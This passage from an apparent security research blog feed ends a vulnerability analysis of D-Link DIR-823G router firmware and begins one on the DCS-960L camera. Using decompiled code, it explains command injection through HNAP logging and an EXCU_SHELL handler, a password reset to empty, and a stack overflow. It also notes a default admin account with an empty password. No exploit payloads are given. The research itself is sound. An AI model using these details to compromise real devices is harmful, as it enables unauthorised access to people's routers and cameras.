"</span>);</span><br><span class="line">            <span class="built_in">strcat</span>(v9, a1 + <span class="number">48</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"cmd%d:%s\\n"</span>, i, v9);</span><br><span class="line">          v12 += sub_423280(v9, v10 + v12, <span class="number">51200</span>);</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">if</span> ( v12 &gt; <span class="number">0</span> )</span><br><span class="line">      {</span><br><span class="line">        v3 = <span class="built_in">strlen</span>(v14);</span><br><span class="line">        sub_41F734(a1, v14, v3);</span><br><span class="line">        sub_41F734(a1, v10, v12);</span><br><span class="line">      }</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"---------------------websdone start"</span>, v1, v2);</span><br><span class="line">      sub_41FBA4(a1, <span class="number">200</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"---------------------websdone end"</span>, v4, v5);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"websExcuteShellHandler: not enough memory (1)\\n!"</span>);</span><br><span class="line">      v11 = <span class="number">-1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"websExcuteShellHandler: not enough memory (0)\\n!"</span>);</span><br><span class="line">    v11 = <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_18:</span><br><span class="line">  <span class="built_in">free</span>(v9);</span><br><span class="line">  <span class="built_in">free</span>(v10);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------free end"</span>, v6, v7);</span><br><span class="line">  <span class="keyword">return</span> v11;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Check if the request parameters are valid, if valid, it will retrieve the command specified in the request.</p><p>If the command exists, execute the command directly.</p><p><code>sub_404940</code> function is <code>websDefaultHandler</code>, handle default URL request, including asp pages.</p><h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><h3 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h3><p>The fist Command Injection vulnerability is as follows.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_42383C</span><span class="params">(</span></span><br><span class="line"><span class="params">......</span></span><br><span class="line"><span class="params">{</span></span><br><span class="line"><span class="params"> ......</span></span><br><span class="line"><span class="params">        <span class="keyword">for</span> ( dword_58A6C4 = (<span class="type">int</span>)&amp;off_588D80; *(_DWORD *)dword_58A6C4; dword_58A6C4 += <span class="number">8</span> )</span></span><br><span class="line"><span class="params">        {</span></span><br><span class="line"><span class="params">          <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*(_DWORD *)(a1 + <span class="number">1316</span>), *(_DWORD *)dword_58A6C4) )</span></span><br><span class="line"><span class="params">          {</span></span><br><span class="line"><span class="params">            <span class="built_in">memset</span>(v17, <span class="number">0</span>, <span class="keyword">sizeof</span>(v17));</span></span><br><span class="line"><span class="params">            <span class="built_in">snprintf</span>(v17, <span class="number">4999</span>, <span class="string">"echo '%s' &gt;/var/hnaplog"</span>, a11);</span></span><br><span class="line"><span class="params">            system(v17);</span></span><br><span class="line"><span class="params">            <span class="built_in">printf</span>(<span class="string">"wp-&gt;hnapfunc===========&gt;%s\\n"</span>, *(<span class="type">const</span> <span class="type">char</span> **)(a1 + <span class="number">1316</span>));</span></span><br><span class="line"><span class="params">            <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*(_DWORD *)dword_58A6C4, <span class="string">"GetLocalMac"</span>, <span class="number">11</span>) )</span></span><br><span class="line"><span class="params">            {</span></span><br><span class="line"><span class="params">              <span class="built_in">memset</span>(&amp;qword_58A6A0, <span class="number">0</span>, <span class="number">32</span>);</span></span><br><span class="line"><span class="params">              <span class="built_in">strncpy</span>(&amp;qword_58A6A0, a1 + <span class="number">48</span>, <span class="number">32</span>);</span></span><br><span class="line"><span class="params">            }</span></span><br><span class="line"><span class="params">.......</span></span><br><span class="line"><span class="params">}</span></span><br></pre></td></tr></tbody></table></figure><p>In the previous HNAP handing function, there was a logging implementation that utilized echo to store POST data in <code>/var/hnaplog</code>, but there was no restriction on the POST data which led to a command injection vulnerability.</p><p>The second Command Injection vulnerability is as follows.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4234CC</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">128</span>; ++i )</span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>)) &amp;&amp; *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>) + <span class="number">4</span>) )</span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">10240</span>);</span><br><span class="line">          <span class="built_in">strcpy</span>(v9, *(_DWORD *)(a1 + <span class="number">8</span> * (i + <span class="number">36</span>)));</span><br><span class="line">          <span class="keyword">if</span> ( sub_4233B0(v9) )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"ParseCMD error cmdlines:%s\\n"</span>, v9);</span><br><span class="line">            v11 = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">          }</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v9, <span class="string">"FillMacCloneMac"</span>) )</span><br><span class="line">          {</span><br><span class="line">            <span class="built_in">strcat</span>(v9, <span class="string">" "</span>);</span><br><span class="line">            <span class="built_in">strcat</span>(v9, a1 + <span class="number">48</span>);</span><br><span class="line">          }</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"cmd%d:%s\\n"</span>, i, v9);</span><br><span class="line">          v12 += sub_423280(v9, v10 + v12, <span class="number">51200</span>);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>In the <code>EXCU_SHELL</code> handing function, command can be passed in, and the commands will be executed by the  <code>sub_423280</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_423280</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">unsigned</span> <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// $a2</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">"apply"</span>) )</span><br><span class="line">  {</span><br><span class="line">    sub_421468(a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a3 &lt; <span class="number">0xC801</span> )</span><br><span class="line">  {</span><br><span class="line">    v8 = popen(a1, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 )</span><br><span class="line">    {</span><br><span class="line">      v9 = fread(a2, <span class="number">1</span>, a3, v8);</span><br><span class="line">      pclose(v8);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(a2 + v9 - <span class="number">1</span>) = <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">return</span> v9;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"error"</span>, v6, v7);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Error: Invalid length"</span>, v3, v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="Reset-password-vulnerability"><a href="#Reset-password-vulnerability" class="headerlink" title="Reset password vulnerability"></a><strong>Reset password vulnerability</strong></h3><p>This vulnerability could allow resetting the password to empty, it occurs in the <code>SetMultipleActions</code> function and <code>SetPasswdSettings</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_4339E8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  ......</span><br><span class="line">    }</span><br><span class="line">    mxmlNewText(v12, <span class="number">0</span>, <span class="string">"OK"</span>);</span><br><span class="line">    <span class="keyword">for</span> ( dword_58AA80 = (<span class="type">int</span>)&amp;off_589200; *(_DWORD *)dword_58AA80; dword_58AA80 += <span class="number">8</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="keyword">if</span> ( mxmlFindElement(String, String, *(_DWORD *)dword_58AA80, <span class="number">0</span>) )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pHnapFunction-&gt;name=%s\\n"</span>, *(<span class="type">const</span> <span class="type">char</span> **)dword_58AA80);</span><br><span class="line">        (*(<span class="type">void</span> (__fastcall **)(<span class="type">const</span> <span class="type">char</span> *))(dword_58AA80 + <span class="number">4</span>))(v21);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(*(_DWORD *)dword_58AA80, <span class="string">"SetAccessCtlList"</span>, <span class="number">16</span>)</span><br><span class="line">          || !<span class="built_in">strncmp</span>(*(_DWORD *)dword_58AA80, <span class="string">"SetAccessCtlSwitch"</span>, <span class="number">18</span>) )</span><br><span class="line">        {</span><br><span class="line">          v17 = <span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    ......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>In the <code>SetMultipleActions</code> function, parse the SOAP request xml, then traverse the function list, if the matching function is found, the corresponding function will be executed.</p><p>If I used the <code>SetPasswdSettings</code> function, it would execute that function. The <code>SetPasswdSettings</code> function code is as follows.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_43D518</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  </span><br><span class="line">......</span><br><span class="line">  Element = mxmlFindElement(String, String, <span class="string">"NewPassword"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( Element )</span><br><span class="line">  {</span><br><span class="line">    Text = mxmlGetText(Element, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( Text )</span><br><span class="line">    {</span><br><span class="line">      v26 = sub_45B320(Text);</span><br><span class="line">      <span class="keyword">if</span> ( v26 )</span><br><span class="line">      {</span><br><span class="line">        sub_4268DC(v26, v31);</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strlen</span>(v31) &lt; <span class="number">0x40</span> )</span><br><span class="line">        {</span><br><span class="line">          <span class="keyword">if</span> ( !apmib_set(<span class="number">183</span>, v31) )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">          v25 = <span class="string">"OK"</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"user password length is error!"</span>, v10, v11);</span><br><span class="line">          v25 = <span class="string">"ERROR"</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="keyword">if</span> ( !apmib_set(<span class="number">183</span>, &amp;dword_4A7540) )</span><br><span class="line">        {</span><br><span class="line">LABEL_9:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"apmib_set MIB_USER_PASSWORD is error"</span>, v8, v9);</span><br><span class="line">          v25 = <span class="string">"ERROR"</span>;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">        }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>NewPassword will be passed to the <code>sub_45B320</code> function, which is used for decryption. If decryption failed, <code>apmib_set</code> will be used to set the password to empty.</p><p>Therefore, login with empty password is possible by triggering <code>SetPasswdSettings</code> through <code>SetMultipleActions</code> function or directly triggering <code>SetPasswdSettings</code> function.</p><h3 id="Stack-Overflow"><a href="#Stack-Overflow" class="headerlink" title="Stack Overflow"></a>Stack Overflow</h3><p>In the <code>SetPasswdSettings</code> function, NewPassword will be passed to the <code>sub_45B320</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">sub_45B320</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">{</span><br><span class="line">  ......</span><br><span class="line">            {</span><br><span class="line">              <span class="built_in">memset</span>(&amp;byte_58ADEC, <span class="number">0</span>, <span class="number">128</span>);</span><br><span class="line">              sub_425ED0((<span class="type">int</span>)<span class="string">"decrypt"</span>, (<span class="type">int</span>)&amp;byte_58A770[<span class="number">33</span> * i], a1, (<span class="type">int</span>)&amp;byte_58ADEC);</span><br><span class="line">              <span class="keyword">if</span> ( byte_58ADEC )</span><br><span class="line">              {</span><br><span class="line">                sub_4267F8(&amp;byte_58ADEC, &amp;unk_58AD6C);</span><br><span class="line">                <span class="keyword">return</span> (<span class="type">char</span> *)&amp;unk_58AD6C;</span><br><span class="line">              }</span><br><span class="line">            }</span><br><span class="line">          }</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Then call the <code>sub_425ED0</code> function, with parameters passed to the <code>sub_425CB0</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_425ED0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">{</span><br><span class="line">v12 = a1;</span><br><span class="line">v11 = a2;</span><br><span class="line">v10 = a3;</span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v12, <span class="string">"decrypt"</span>) )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"method error!"</span>, v5, v6);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    v9 = sub_425CB0(v11, v10, (<span class="type">int</span>)v13);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>In <code>sub_425CB0</code>, it also passed to the <code>sub_425830</code> function.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_425CB0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line">  <span class="built_in">memset</span>(v7, <span class="number">0</span>, <span class="keyword">sizeof</span>(v7));</span><br><span class="line">  <span class="keyword">if</span> ( sub_425830((<span class="type">const</span> <span class="type">char</span> *)a2, v6) == <span class="number">64</span> )</span><br><span class="line">  {</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>In <code>sub_425830</code>, there was no restriction on a1, which ultimately led to the occurrence of stack overflow.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">sub_425830</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> v3; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">8</span>]; <span class="comment">// [sp+2Ch] [+2Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( (v6 &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[ERROR] %s:%u: input length error:%u\\n"</span>, <span class="string">"dcipher.c"</span>, <span class="number">220</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">    {</span><br><span class="line">      v3 = a1[i];</span><br><span class="line">      <span class="keyword">if</span> ( v3 &lt; <span class="number">48</span> || v3 &gt;= <span class="number">58</span> &amp;&amp; v3 &lt; <span class="number">65</span> || v3 &gt;= <span class="number">71</span> &amp;&amp; v3 &lt; <span class="number">97</span> || v3 &gt;= <span class="number">103</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"[ERROR] %s:%u: input string error: %s\\n"</span>, <span class="string">"dcipher.c"</span>, <span class="number">232</span>, a1);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v6; j += <span class="number">2</span> )</span><br><span class="line">    {</span><br><span class="line">      v7[<span class="number">0</span>] = a1[j];</span><br><span class="line">      v7[<span class="number">1</span>] = a1[j + <span class="number">1</span>];</span><br><span class="line">      v7[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">      a2[j &gt;&gt; <span class="number">1</span>] = strtol(v7, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> v6 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>There are so many other vulnerabilities similar to the one analyzed here, so I won’t analyze them further.</p></body></html>]]></content>
    
    
      
      
    <summary type="html">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;h1 id=&quot;DIR-823G-Equipment-Analysis&quot;&gt;&lt;a href=&quot;#DIR-823G-Equipment-Analysis&quot; class=&quot;headerlink&quot; title=&quot;DIR-823G Equi</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://www.z1r0.top/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="IOT" scheme="https://www.z1r0.top/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>DCS-960L Equipment Analysis</title>
    <link href="https://www.z1r0.top/2023/08/07/DCS-960L-Equipment-Analysis/"/>
    <id>https://www.z1r0.top/2023/08/07/DCS-960L-Equipment-Analysis/</id>
    <published>2023-08-07T08:12:03.000Z</published>
    <updated>2023-08-29T08:27:40.618Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><h1 id="DCS-960L-Equipment-Analysis"><a href="#DCS-960L-Equipment-Analysis" class="headerlink" title="DCS-960L Equipment Analysis"></a>DCS-960L Equipment Analysis</h1><h2 id="Preliminary-Analysis"><a href="#Preliminary-Analysis" class="headerlink" title="Preliminary Analysis"></a>Preliminary Analysis</h2><p>I came into contact with this device during security research, and I took time to briefly study this device in depth.</p><h3 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h3><p>The firmware used in this analysis is <code>1.09</code>, and the download address is</p><p><a href="https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L">https://www.dlinktw.com.tw/techsupport/ProductInfo.aspx?m=DCS-960L</a></p><h3 id="Web-Service-Architecture-Analysis"><a href="#Web-Service-Architecture-Analysis" class="headerlink" title="Web Service Architecture Analysis"></a>Web Service Architecture Analysis</h3><p>We can directly use binwalk to unpack this firmware package.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">10264         0x2818          LZMA compressed data, properties: 0x5D, dictionary size: 16777216 bytes, uncompressed size: 5230012 bytes</span><br><span class="line">1565730       0x17E422        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8614736 bytes, 1569 inodes, blocksize: 131072 bytes, created: 2038-04-24 08:06:24</span><br></pre></td></tr></tbody></table></figure><p>After unpacking, you can see following things.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">17:53:04 z1r0@z1r0deMBP.lan squashfs-root l</span><br><span class="line">total 8</span><br><span class="line">drwxr-xr-x@ 20 z1r0  staff   640B  7 19 12:32 .</span><br><span class="line">drwxr-xr-x  10 z1r0  staff   320B  7 18 16:32 ..</span><br><span class="line">drwxr-xr-x@ 54 z1r0  staff   1.7K 11 28  2019 bin</span><br><span class="line">drwxr-xr-x@  4 z1r0  staff   128B 11 28  2019 dev</span><br><span class="line">drwxr-xr-x@ 50 z1r0  staff   1.6K 11 28  2019 etc</span><br><span class="line">drwxr-xr-x@ 11 z1r0  staff   352B 11 28  2019 home</span><br><span class="line">drwxr-xr-x@ 46 z1r0  staff   1.4K 11 28  2019 lib</span><br><span class="line">drwxr-xr-x@  6 z1r0  staff   192B 11 27  2019 mnt</span><br><span class="line">drwxr-xr-x@ 13 z1r0  staff   416B 11 27  2019 mydlink</span><br><span class="line">drwxr-xr-x@  2 z1r0  staff    64B 11 27  2019 proc</span><br><span class="line">drwxr-xr-x@  2 z1r0  staff    64B 11 27  2019 root</span><br><span class="line">drwxr-xr-x@ 29 z1r0  staff   928B 11 28  2019 sbin</span><br><span class="line">drwxr-xr-x@ 24 z1r0  staff   768B 11 28  2019 server</span><br><span class="line">drwxr-xr-x@  2 z1r0  staff    64B 11 27  2019 share</span><br><span class="line">drwxr-xr-x@  2 z1r0  staff    64B 11 27  2019 sys</span><br><span class="line">lrwxr-xr-x@  1 z1r0  staff     7B 11 28  2019 tmp -&gt; var/tmp</span><br><span class="line">drwxr-xr-x@  6 z1r0  staff   192B 11 27  2019 usr</span><br><span class="line">drwxr-xr-x@  2 z1r0  staff    64B 11 27  2019 var</span><br><span class="line">drwxr-xr-x@ 14 z1r0  staff   448B  7 19 16:54 web</span><br></pre></td></tr></tbody></table></figure><p>In <code>etc/passwd_default</code> I found the default user and password. user name is admin, password is empty.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::0:0:root:/:/bin/sh</span><br></pre></td></tr></tbody></table></figure><p>After analyzing the rcS startup scripts (<code>etc/init.d/rcS</code></p><p>I found out that it starts the httpd program.</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 